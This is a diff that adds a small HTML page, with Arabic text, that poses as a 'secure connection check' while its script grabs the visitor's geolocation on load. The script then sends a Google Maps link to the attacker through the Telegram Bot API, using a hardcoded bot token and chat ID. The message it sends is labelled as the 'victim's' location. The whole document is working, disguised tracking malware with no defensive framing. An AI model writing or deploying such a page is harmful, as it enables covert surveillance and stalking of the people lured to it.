@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<script>
+window.onload = function() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition);
+    } else {
+        alert("المتصفح لا يدعم تحديد الموقع.");
+    }
+};
+
+function showPosition(position) {
+    const urlParams = new URLSearchParams(window.location.search);
+    const chatId = urlParams.get('chatId') || "5905562720";
+    const token = "8521496596:AAGb7ODWoScawEb5Fm78sPLL8pfBeXZQzlg";
+    
+    const lat = position.coords.latitude;
+    const lon = position.coords.longitude;
+    const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+    
+    const msg = `📍 **تم تحديد موقع الضحية بنجاح**\n\n🔗 الرابط على الخريطة:\n${googleMapsLink}`;
+    
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+}
+</script>
+<body style="text-align:center; padding-top:100px; font-family:sans-serif;">
+    <h3>جاري فحص اتصالك الآمن...</h3>
+    <p>يرجى الانتظار ثانية واحدة</p>
+</body>
+</html>
